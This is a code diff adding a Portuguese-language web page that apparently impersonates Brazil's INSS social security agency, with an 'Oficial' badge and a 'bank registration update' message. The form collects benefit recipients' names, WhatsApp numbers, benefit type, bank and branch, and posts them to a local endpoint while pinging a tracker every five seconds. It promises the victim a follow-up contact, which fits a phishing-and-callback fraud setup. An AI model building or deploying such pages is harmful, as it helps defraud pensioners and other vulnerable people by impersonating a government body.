@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Atualização Cadastral</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,300&display=swap" rel="stylesheet">
+<style>
+html { scroll-behavior: smooth; }
+
+:root {
+  color-scheme: light;
+  --bg: #F8F8F8;
+  --surface: #FFFFFF;
+  --hero-bg: #071D41;
+  --accent: #1351B4;
+  --accent-dim: rgba(19,81,180,0.10);
+  --accent-hover: #0C326F;
+  --yellow: #FFCD07;
+  --text: #1B1B1B;
+  --text-muted: #555555;
+  --border: #CCCCCC;
+  --shadow: 0 4px 20px rgba(0,0,0,0.08);
+  --r: 4px;
+  --rl: 8px;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    color-scheme: dark;
+    --bg: #0A1628;
+    --surface: #0F2040;
+    --text: #E8EDF5;
+    --text-muted: #8FA3C0;
+    --border: #1E3A5F;
+    --shadow: 0 4px 20px rgba(0,0,0,0.35);
+  }
+}
+:root[data-theme="dark"] {
+  color-scheme: dark;
+  --bg: #0A1628;
+  --surface: #0F2040;
+  --text: #E8EDF5;
+  --text-muted: #8FA3C0;
+  --border: #1E3A5F;
+  --shadow: 0 4px 20px rgba(0,0,0,0.35);
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: 'DM Sans', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 1rem;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+.wrap {
+  max-width: 560px;
+  margin-inline: auto;
+  padding-inline: clamp(16px, 4vw, 32px);
+}
+
+/* HEADER */
+header {
+  background: rgba(12,34,64,0.97);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+}
+.hdr {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding-block: 18px;
+}
+.logo {
+  font-family: 'Sora', sans-serif;
+  font-weight: 800;
+  font-size: 1.1rem;
+  color: #fff;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  letter-spacing: -0.02em;
+}
+.logo-pill {
+  background: rgba(255,205,7,0.15);
+  border: 1px solid rgba(255,205,7,0.35);
+  color: var(--yellow);
+  font-size: .6rem;
+  font-weight: 700;
+  letter-spacing: .08em;
+  padding: 2px 7px;
+  border-radius: 20px;
+  text-transform: uppercase;
+}
+
+/* HERO MINI */
+.hero-mini {
+  background: var(--hero-bg);
+  padding: 40px 0 32px;
+  text-align: center;
+}
+.hero-mini .eyebrow {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: rgba(255,205,7,0.12);
+  border: 1px solid rgba(255,205,7,0.30);
+  color: var(--yellow);
+  font-size: .72rem;
+  font-weight: 700;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+  padding: 5px 14px;
+  border-radius: 20px;
+  margin-bottom: 18px;
+}
+.hero-mini h1 {
+  font-family: 'Sora', sans-serif;
+  font-size: clamp(1.4rem, 4vw, 2rem);
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.2;
+  margin-bottom: 10px;
+}
+.hero-mini p {
+  font-size: .95rem;
+  color: rgba(255,255,255,0.65);
+  max-width: 440px;
+  margin-inline: auto;
+}
+
+/* FORM SECTION */
+.form-section {
+  padding: 40px 0 60px;
+  flex: 1;
+}
+.form-card {
+  background: var(--surface);
+  border: 1.5px solid var(--border);
+  border-radius: 22px;
+  padding: clamp(24px, 4vw, 40px);
+  box-shadow: var(--shadow);
+}
+.fgrid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.fg { display: flex; flex-direction: column; gap: 6px; }
+.fg.full { grid-column: 1 / -1; }
+label { font-size: .8rem; font-weight: 600; color: var(--text); }
+
+input[type="text"],
+input[type="tel"],
+select {
+  width: 100%;
+  background: var(--bg);
+  border: 1.5px solid var(--border);
+  border-radius: 9px;
+  padding: 13px 14px;
+  font-family: 'DM Sans', sans-serif;
+  font-size: .9rem;
+  color: var(--text);
+  outline: none;
+  transition: border-color .2s, box-shadow .2s;
+}
+input::placeholder { color: var(--text-muted); opacity: .55; }
+input:focus, select:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 3px rgba(19,81,180,0.12);
+}
+select {
+  appearance: none;
+  -webkit-appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='none' stroke='%236B7393' stroke-width='1.5'%3E%3Cpath d='M5 7.5l5 5 5-5'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 12px center;
+  background-size: 18px;
+  padding-right: 38px;
+  cursor: pointer;
+}
+
+.submit-btn {
+  width: 100%;
+  margin-top: 8px;
+  background: linear-gradient(135deg, var(--yellow) 0%, #F0A800 100%);
+  color: var(--hero-bg);
+  font-family: 'Sora', sans-serif;
+  font-size: 1rem;
+  font-weight: 800;
+  padding: 16px;
+  border-radius: 10px;
+  border: none;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 5px 22px rgba(255,205,7,0.35);
+  transition: transform .15s, box-shadow .2s;
+  letter-spacing: .01em;
+}
+.submit-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,205,7,0.45); }
+.submit-btn:active { transform: translateY(0); }
+
+.form-note {
+  text-align: center;
+  font-size: .74rem;
+  color: var(--text-muted);
+  margin-top: 14px;
+  line-height: 1.5;
+}
+
+.form-ok { display: none; text-align: center; padding: 32px 16px; }
+.form-ok.show { display: block; }
+.ok-ring {
+  width: 72px; height: 72px;
+  background: rgba(22,136,33,0.10);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 20px;
+  color: #168821;
+}
+.form-ok h3 { font-family: 'Sora', sans-serif; font-size: 1.3rem; font-weight: 700; margin-bottom: 10px; }
+.form-ok p { font-size: .9rem; color: var(--text-muted); line-height: 1.65; }
+
+/* FOOTER */
+footer {
+  background: var(--hero-bg);
+  padding: 20px 0;
+  text-align: center;
+}
+footer p {
+  font-size: .75rem;
+  color: rgba(255,255,255,0.4);
+}
+
+@media (max-width: 480px) {
+  .fgrid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <div class="hdr">
+      <div class="logo">
+        <span>INSS<strong style="color:var(--yellow)">Benefício</strong></span>
+        <span class="logo-pill">Oficial</span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="hero-mini">
+  <div class="wrap">
+    <div class="eyebrow">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Atualização Necessária
+    </div>
+    <h1>Atualização Cadastral<br>Bancária</h1>
+    <p>Preencha os dados abaixo para atualizar seu cadastro e garantir o recebimento do seu benefício.</p>
+  </div>
+</div>
+
+<section class="form-section">
+  <div class="wrap">
+    <div class="form-card">
+
+      <div id="formWrap">
+        <form id="bform" onsubmit="enviarBanco(event)">
+          <div class="fgrid">
+
+            <div class="fg full">
+              <label for="bnome">Nome completo</label>
+              <input type="text" id="bnome" placeholder="Seu nome completo" required>
+            </div>
+
+            <div class="fg full">
+              <label for="btel">WhatsApp / Telefone</label>
+              <input type="tel" id="btel" placeholder="(00) 00000-0000" required>
+            </div>
+
+            <div class="fg full">
+              <label for="btipo">Tipo de benefício</label>
+              <select id="btipo" required>
+                <option value="" disabled selected>Selecione o tipo</option>
+                <option>Receber dinheiro INSS</option>
+                <option>Aposentadoria</option>
+                <option>Pensão por Morte</option>
+                <option>Auxílio-Doença / BPC</option>
+                <option>LOAS</option>
+                <option>Outro</option>
+              </select>
+            </div>
+
+            <div class="fg full">
+              <label for="bbanco">Banco onde recebe o benefício</label>
+              <select id="bbanco" required>
+                <option value="" disabled selected>Selecione o banco</option>
+                <option>Caixa Econômica Federal</option>
+                <option>Banco do Brasil</option>
+                <option>Bradesco</option>
+                <option>Itaú</option>
+                <option>Santander</option>
+                <option>Nubank</option>
+                <option>Inter</option>
+                <option>Mercado Pago</option>
+                <option>PicPay</option>
+                <option>BMG</option>
+                <option>Safra</option>
+                <option>Pan</option>
+                <option>Outro</option>
+              </select>
+            </div>
+
+            <div class="fg full">
+              <label for="bagencia">Agência</label>
+              <input type="text" id="bagencia" placeholder="Ex: 0001" required>
+            </div>
+
+          </div>
+
+          <button type="submit" class="submit-btn" id="submitBtn">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            ATUALIZAR CADASTRO
+          </button>
+
+          <p class="form-note">
+            🔒 Seus dados estão protegidos e serão usados exclusivamente para atualização cadastral.
+          </p>
+        </form>
+      </div>
+
+      <div class="form-ok" id="formOk">
+        <div class="ok-ring">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <h3>Cadastro atualizado!</h3>
+        <p>Seus dados foram recebidos com sucesso.<br>Em breve você será contactado.</p>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<footer>
+  <p>© 2024 INSSBenefício — Todos os direitos reservados</p>
+</footer>
+
+<script>
+// Máscara telefone
+document.getElementById('btel').addEventListener('input', function() {
+  let v = this.value.replace(/\D/g,'').slice(0,11);
+  if (v.length >= 11) v = v.replace(/(\d{2})(\d{5})(\d{4})/,'($1) $2-$3');
+  else if (v.length >= 7) v = v.replace(/(\d{2})(\d{4,5})(\d{0,4})/,'($1) $2-$3');
+  else if (v.length >= 3) v = v.replace(/(\d{2})(\d+)/,'($1) $2');
+  this.value = v;
+});
+
+async function enviarBanco(e) {
+  e.preventDefault();
+  const btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Enviando…';
+
+  const payload = {
+    nome:     document.getElementById('bnome').value.trim(),
+    telefone: document.getElementById('btel').value.trim(),
+    tipo:     document.getElementById('btipo').value,
+    mensagem: 'Banco: ' + document.getElementById('bbanco').value + ' | Agência: ' + document.getElementById('bagencia').value.trim(),
+  };
+
+  try {
+    const r = await fetch('/api/contato', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    });
+    if (r.ok) {
+      document.getElementById('formWrap').style.display = 'none';
+      document.getElementById('formOk').classList.add('show');
+    } else {
+      throw new Error();
+    }
+  } catch {
+    alert('Erro ao enviar. Tente novamente.');
+    btn.disabled = false;
+    btn.textContent = 'ATUALIZAR CADASTRO';
+  }
+}
+
+// Registra visita
+fetch('/api/visita', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({pagina:'/banco'})}).catch(()=>{});
+const _uid = (localStorage.getItem('_uid') || Math.random().toString(36).slice(2));
+localStorage.setItem('_uid', _uid);
+function _ping(){ fetch('/api/ping',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:_uid})}).catch(()=>{}); }
+_ping(); setInterval(_ping, 5000);
+</script>
+
+</body>
+</html>
